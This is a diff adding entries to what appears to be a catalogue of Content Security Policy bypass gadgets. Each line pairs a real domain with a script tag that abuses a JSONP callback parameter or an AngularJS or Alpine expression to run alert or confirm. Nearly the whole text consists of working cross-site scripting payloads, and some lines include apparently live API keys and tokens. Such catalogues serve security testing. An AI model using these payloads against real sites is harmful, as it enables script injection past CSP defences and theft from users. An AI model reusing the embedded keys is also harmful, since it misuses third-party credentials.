@@ -42,6 +42,7 @@ api.mixpanel.com	<script src="https://api.mixpanel.com/track/?callback=alert(133
 api.ninchat.com  <script src="https://api.ninchat.com/v2/call?data=%7B%22action%22%3A%22describe_queue%22%2C%22realm_id%22%3A%221%22%2C%22queue_id%22%3A%221%22%7D&callback=alert(1)"></script>
 api.olark.com	<script src="https://api.olark.com/2.0/visitors/z1nRAdDubyUjGyih018BZ0P04rBy00W3?_callback=alert&_method=PUT"></script>
 api.onesignal.com  <script src="https://api.onesignal.com/sync/0a5d329d-664d-4253-9bdd-62f208e2ae79/web?callback=alert(1)"></script>
+api.parsely.com	<script src="https://api.parsely.com/v2/profile?callback=window.alert(window.origin)"></script>
 api.pinterest.com	<script src="https://api.pinterest.com/v1/urls/count.json?callback=window.alert&url=x"></script>
 api.recurly.com	<script src="https://api.recurly.com/js/v1/engage/settings?callback=alert(1)"></script>
 api.stackexchange.com	<script src="https://api.stackexchange.com/2.2/me?callback=alert(1)-"></script>
@@ -61,6 +62,7 @@ app.hushly.com	<script src="https://app.hushly.com/runtime/visitor?callback=aler
 app.link	<script src="https://app.link/_r?sdk=web&callback=alert"></script>
 appointlet.com	<script src="https://appointlet.com/wp-json?_jsonp=window.alert"></script>
 apps.bdimg.com	<body ng-app ng-csp><script src="https://apps.bdimg.com/libs/angular.js/1.4.6/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
+as-sec.casalemedia.com	<script src="https://as-sec.casalemedia.com/cygnus?s=1195257&r=%7B%22id%22%3A%221%22%2C%22imp%22%3A%5B%5D%7D&fn=window.alert"></script>
 assets.grubhub.com	<body ng-app ng-csp><script src="https://assets.grubhub.com/libs/js/angular/1.8.3/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
 assets.guim.co.uk	<script src=https://assets.guim.co.uk/polyfill.io/v3/polyfill.min.js?callback=alert></script>
 assets.twitch.tv	<script src="https://assets.twitch.tv/eppo/api/flag-config/v1/config?sdkName=js-sdk-client&sdkVersion=3.1.2&apiKey=3mv-BKCSZJDyZrwfqK86har6u13NgxRh.ZWg9bTRsZHJnLmUuZXBwby5jbG91ZCZjcz1tNGxkcmc&callback=alert()">
@@ -69,6 +71,7 @@ bildirt.com	<script src="https://bildirt.com/wp-json?_jsonp=window.alert"></scri
 boards.greenhouse.io	<script src="https://boards.greenhouse.io/uncacheable_attributes/presigned_fields?callback=window.alert"></script>
 bookmark.hatenaapis.com	<script src="https://bookmark.hatenaapis.com/count/entry?url=x&callback=window.alert"></script>
 buy.tinypass.com	<script src="https://buy.tinypass.com/api/v3/anon/template/loadTemplateContext?callback=alert"></script>
+c.dun.163.com	<script src="https://c.dun.163.com/api/v2/getconf?iv=5&callback=window.alert"></script>
 c.y.qq.com	<script src="https://c.y.qq.com/v8/fcg-bin/v8.fcg?notice=0&format=jsonp&channel=singer&page=list&jsonpCallback=window.alert"></script>
 cas.criteo.com	<script src="https://cas.criteo.com/delivery/0.1/napi.jsonp?zoneid=377600&callback=alert"></script>
 cdn.arcgis.com  <script src="https://cdn.arcgis.com/sharing/rest/content/items/x/resources/styles/root.json?f=json&token=x&callback=alert(1)"></script>
@@ -84,6 +87,7 @@ cdn.staticfile.org	<script src="https://cdn.staticfile.org/angular.js/1.8.3/angu
 cdn.syncfusion.com	<body ng-app ng-csp><script src="https://cdn.syncfusion.com/js/assets/external/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
 cdnjs.cloudflare.com	<script src="https://cdnjs.cloudflare.com/ajax/libs/alpinejs/3.10.5/cdn.min.js"></script><div x-init="alert(1)">
 cdnjs.cloudflare.com	<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.js"></script><div ng-app><img src=x ng-on-error="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">
+celtraidentity.com	<script src="https://celtraidentity.com/fbbdf2d8?countryCode=NL&cb=window.alert"></script>
 challenges.cloudflare.com	<script src="https://challenges.cloudflare.com/turnstile/v0/api.js?onload=alert"></script>
 client-api.arkoselabs.com	<script src="https://client-api.arkoselabs.com/fc/a/?callback=window.alert"></script>
 client.crisp.chat	<script src="https://client.crisp.chat/settings/website/x/?callback=-alert(1)//"></script>
@@ -104,6 +108,7 @@ count-server.sharethis.com	<script src="https://count-server.sharethis.com/v2.0/
 core-renderer-tiles.maps.yandex.net  <script src="https://core-renderer-tiles.maps.yandex.net/tiles?l=mapj&v=1&x=1&y=520&z=11&callback=alert"></script>
 core-stv-renderer.maps.yandex.net  <script src="https://core-stv-renderer.maps.yandex.net/2.x/tiles?l=stj&x=1&y=1&z=11&scale=1&v=1&format=js&callback=alert"></script>
 cr.testfreaks.com  <script src="https://cr.testfreaks.com/all-reviews.json?client_id=kodin1-fi&callback=alert"></script>
+cse.google.com	<script src="https://cse.google.com/cse/element/v1?cselibv=93e57cb47c499c53&callback=window.alert&rurl=https%3A%2F%2Fwww.ala.org%2Fsearch%2Fsite%3Fkeys%3Dx"></script>
 ct.beslist.nl	<script src="https://ct.beslist.nl/ct_refresh?shopid=%22;%0a%0dalert(1);%20//%20"></script>
 cubepile.com	<script src="https://cubepile.com/wp-json?_jsonp=window.alert"></script>
 d.adroll.com	<script src="https://d.adroll.com/user_attrs?advertisable_eid=5L5IV3X4ZNCUZFMLN5KKOD&jsonp=alert(document.domain)"></script>
@@ -115,6 +120,7 @@ dblp.org	<script src="https://dblp.org/search/venue/api?q=&h=1000&c=0&rd=1a&form
 demandbase.com	<script src="https://demandbase.com/wp-json?_jsonp=window.alert"></script>
 demo.matomo.cloud	<script src="https://demo.matomo.cloud/?module=API&method=Overlay.getTranslations&idSite=1&format=JSON&callback=window.alert"></script>
 dev.virtualearth.net	<script src="https://dev.virtualearth.net/REST/v1/Imagery/Metadata/Road?jsonp=alert(document.domain);//"></script>
+disqus.com	<script src="https://disqus.com/api/3.0/forums/details?forum=festivalfans&api_key=E8Uh5l5fHZ6gD8U3KycjAIAk46f68Zw7C6eW8WSjZvCLXebZ7p0r1yrYDrLilk2F&callback=window.alert"></script>
 dit.whatsapp.net	<script src="https://dit.whatsapp.net/deidentified_telemetry?callback=window.alert"></script>
 documentation-resources.opendatasoft.com	<script src="https://documentation-resources.opendatasoft.com/api/datasets/1.0/doc-geonames-cities-5000/?format=jsonp&callback=confirm(1);"></script>
 dpm.demdex.net	<script src="https://dpm.demdex.net/id?d_cb=window.alert"></script>
@@ -125,6 +131,7 @@ e.cquotient.com	<script src="https://e.cquotient.com/recs/bflp-Wells/cart_recome
 elysiumwebsite.s3.amazonaws.com	<body ng-app ng-csp><script src="//elysiumwebsite.s3.amazonaws.com/uploads/blog-media/rockstar/angular.min.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>
 eu.battle.net	<script src="https://eu.battle.net/support/update/json?callback=window.alert"></script>
 fast.wistia.com	<script src="https://fast.wistia.com/embed/medias/o75jtw7654.json?callback=window.alert"></script>
+fast.wistia.net	<script src="https://fast.wistia.net/embed/medias/ks6qp1q2fn.json?callback=window.alert"></script>
 firebase.googleapis.com	<script src="https://firebase.googleapis.com/v1alpha/projects/-/apps/1:789788471140:web:7e31b15959d68ac0a51471/webConfig?callback=alert(1)-1;"></script>
 foremedia.net	<script src="https://foremedia.net/wp-json?_jsonp=window.alert"></script>
 forms.hsforms.com	<script src="https://forms.hsforms.com/embed/v3/form/1/00000000-0000-0000-0000-000000000000?callback=window.alert"></script>
@@ -157,6 +164,7 @@ info.elastic.co	<script src="https://info.elastic.co/index.php/form/getForm?munc
 inno.blob.core.windows.net	<body ng-app ng-csp><script src="//inno.blob.core.windows.net/new/libs/AngularJS/1.2.1/angular.min.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>
 investor.coinbase.com	<script src="https://investor.coinbase.com/feed/People.svc/GetPeopleList?callback=confirm(document.domain);"></script>
 ipinfo.io	<script src="https://ipinfo.io/?format=jsonp&callback=alert"></script>
+ipv4.d.adroll.com	<script src="https://ipv4.d.adroll.com/user_attrs?jsonp=window.alert(window.origin)"></script>
 itunes.apple.com	<script src="https://itunes.apple.com/se/rss/toppodcasts/json?callback=alert"></script>
 jewelbetting.co	<script src="https://jewelbetting.co/wp-json?_jsonp=window.alert"></script>
 jquery.com	<script src="https://jquery.com/wp-json?_jsonp=window.alert"></script>
@@ -186,6 +194,7 @@ mc.yandex.ru	<script src="https://mc.yandex.ru/watch/9528925/1?wmode=5&callback=
 monitoring.clients6.google.com	<script src="https://monitoring.clients6.google.com/v3/projects/gen-lang-client-1/groups?callback=alert(1)"></script>
 mouseflow.com	<script src="https://mouseflow.com/wp-json?_jsonp=window.alert"></script>
 mts1.googleapis.com	<script src="https://mts1.googleapis.com/mapslt/ft?hl=en&lyrs=ft&x=1&y=1&z=1&src=apiv3&callback=alert(1)"></script>
+na5.thunderhead.com	<script src="https://na5.thunderhead.com/one/rt/web/v1/ONE-P897OSQPQO-1516?callback=window.alert(window.origin)"></script>
 njkqvifkj7ta6kg86wczisp36m8d01mg.edns.ip-api.com	<script src="https://njkqvifkj7ta6kg86wczisp36m8d01mg.edns.ip-api.com/json?callback=alert(1)"></script>
 noembed.com	<script src="https://noembed.com/embed?url=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DdQw4w9WgXcQ&callback=alert(1)-"></script>
 nominatim.openstreetmap.org	<script src="https://nominatim.openstreetmap.org/search?q=&format=json&addressdetails=1&polygon_geojson=1&json_callback=alert"></script>
@@ -196,13 +205,16 @@ omtr2.partners.salesforce.com	<script src="https://omtr2.partners.salesforce.com
 onesignal.com	<script src="https://onesignal.com/api/v1/sync/0a5d329d-664d-4253-9bdd-62f208e2ae79/web?callback=alert(1)-"></script>
 openexchangerates.org	<script src="https://openexchangerates.org/api/latest.json?app_id=4a363014b909486b8f49d967b810a6c3&callback=alert(document.domain)"></script>
 openx.com	<script src="https://openx.com/wp-json?_jsonp=window.alert"></script>
+p.cquotient.com	<script src="https://p.cquotient.com/pebble?tla=bbrk-HemaNL&callback=window.alert"></script>
 page.gitlab.com	<script src="https://page.gitlab.com/index.php/form/getForm?munchkinId=194-VVC-221&form=1077&callback=alert"></script>
 pages.nist.gov	<body ng-app ng-csp><script src="https://pages.nist.gov/opensource/js/angular.min.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>
 partner.googleadservices.com	<script src="https://partner.googleadservices.com/gampad/cookie.js?domain=x&callback=window.alert&client=ca-pub-3374367632700222"></script>
 passport.baidu.com	<script src="https://passport.baidu.com/channel/unicast?callback=alert"></script>
+polo.feathr.co	<script src="https://polo.feathr.co/v1/analytics/match/script.js?pk=alert"></script>
 polyfill-fastly.io	<script src="https://polyfill-fastly.io/v3/polyfill.min.js?callback=alert"></script>
 polyfill.alicdn.com	<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?callback=alert"></script>
 preply.com	<script src="https://preply.com/wp-json?_jsonp=window.alert"></script>
+pro.ip-api.com	<script src="https://pro.ip-api.com/json/?key=33arzTfj1gigDqW&callback=window.alert(window.origin)"></script>
 pubads.g.doubleclick.net	<script src="https://pubads.g.doubleclick.net/gampad/ads?gdfp_req=1&output=json_html&callback=window.alert&impl=fifs&json_a=1&iu_parts=4215%2Cimdb2.consumer.homepage&enc_prev_ius=%2F0%2F1%2C%2F0%2F1&prev_iu_szs=1008x150%7C1008x200%7C1008x30%7C970x250%7C9x1%2C300x250%7C11x1&cust_params=fv%3D1%26ab%3Df%26bpx%3D1%26c%3D1%26s%3D3075%252C32%26u%3D142752923777%26oe%3Dutf-8"></script>
 public-api.wordpress.com	<script src="https://public-api.wordpress.com/rest/v1/sites/en.blog.wordpress.com/posts/?number=1&callback=window.alert"></script>
 publish.twitter.com	<script src="https://publish.twitter.com/oembed?url=https%3A%2F%2Ftwitter.com%2Fjack%2Fstatus%2F20&callback=window.alert"></script>
@@ -221,6 +233,7 @@ ring.com	<script src="https://ring.com/partials/consent/sv-SE/strings.json?callb
 romania.amazon.com	<body ng-app ng-csp><script src="https://romania.amazon.com/app/vendor.min.js"></script><input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(1)'></body>
 rtb0.doubleverify.com	<script src="https://rtb0.doubleverify.com/verify.js?jsCallback=alert(1)"></script>
 s.fqtag.com	<script src="https://s.fqtag.com/b?callback=alert(1)"></script>
+s.swiftypecdn.com	<script src="https://s.swiftypecdn.com/install/v2/config/N-DNg_K55_uKdDgRwnR-.json?callback=window.alert"></script>
 s.yimg.jp	<body ng-app ng-csp><script src="https://s.yimg.jp/images/jpnews/cre/owned_media/v2/js/angular.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>
 s.ytimg.com	<body ng-app ng-csp><script src="https://s.ytimg.com/yts/jslib/angular.min-vfl8oYsy-.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
 sanalofisonline.com	<script src="https://sanalofisonline.com/wp-json?_jsonp=window.alert"></script>
@@ -250,6 +263,7 @@ suggestqueries-clients6.youtube.com	<script src="https://suggestqueries-clients6
 support.zendesk.com	<script src="https://support.zendesk.com/accounts/reminder?callback=alert(window.location)//"></script>
 sync.im-apps.net	<script src="https://sync.im-apps.net/imid/segment?callback=alert(1)&token=VXoW9wEaCAYxiIkb8Mzm7Q"></script>
 tagmanager.google.com	<script src="https://tagmanager.google.com/debug/api/vtinfo?gtm_auth=a-0uanYFkML7e3v7Vmxpwg&env_id=env-8&public_id=GTM-TWMCBFD&templates=&callback=alert"></script>
+tb.de17a.com	<script src="https://tb.de17a.com/api/pageView?callback=window.alert(window.origin)"></script>
 tebilisim.com	<script src="https://tebilisim.com/wp-json?_jsonp=window.alert"></script>
 termly.io	<script src="https://termly.io/wp-json?_jsonp=window.alert"></script>
 thebrave.io	<script src="https://thebrave.io/wp-json?_jsonp=window.alert"></script>
@@ -275,6 +289,8 @@ urs.pbs.org	<script src="https://urs.pbs.org/redirect/1/?format=jsonp&callback=a
 usercentrics.eu	<script src="https://usercentrics.eu/wp-json?_jsonp=window.alert"></script>
 vidyome.com	<script src="https://vidyome.com/wp-json?_jsonp=window.alert"></script>
 vimeo.com	<script src="https://vimeo.com/api/v2/video/1006042481.json?callback=window.alert"></script>
+visitor-service-ap-southeast-2.tealiumiq.com	<script src="https://visitor-service-ap-southeast-2.tealiumiq.com/bupa.au/main/01a0208752750019b0fc6835b72905075002006d009bd?callback=window.alert(window.origin)"></script>
+visitor-service-eu-central-1.tealiumiq.com	<script src="https://visitor-service-eu-central-1.tealiumiq.com/iberostar/main/01a004d90c1d0021df3daa1cfd9405075004f06d009bd?callback=window.alert(window.origin)"></script>
 visitor-service.tealiumiq.com	<script src="https://visitor-service.tealiumiq.com/northwesternmutual/main/q?callback=alert(1)"></script>
 visualwebsiteoptimizer.com	<script src="https://visualwebsiteoptimizer.com/wp-json/wp/v2/posts/?_jsonp=window.alert"></script>
 wb.amap.com	<script src="https://wb.amap.com/channel.php?callback=window.alert"></script>
@@ -324,6 +340,7 @@ www.reklamstore.com	<script src="https://www.reklamstore.com/wp-json?_jsonp=wind
 www.sanalofisonline.com	<script src="https://www.sanalofisonline.com/wp-json?_jsonp=window.alert"></script>
 www.sovrn.com	<script src="https://www.sovrn.com/wp-json?_jsonp=window.alert"></script>
 www.st.com	<body ng-app ng-csp><script src="https://www.st.com/etc/clientlibs/st-search-cx/stangularjs.min.d9f5c8180af41b5cae710870b6b018fe.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
+www.stay22.com	<script src="https://www.stay22.com/ext/partner/settings?callback=window.alert"></script>
 www.thebrave.io	<script src="https://www.thebrave.io/wp-json?_jsonp=window.alert"></script>
 www.vidyome.com	<script src="https://www.vidyome.com/wp-json?_jsonp=window.alert"></script>
 www.wildapricot.com	<script src="https://www.wildapricot.com/wp-json?_jsonp=window.alert"></script>
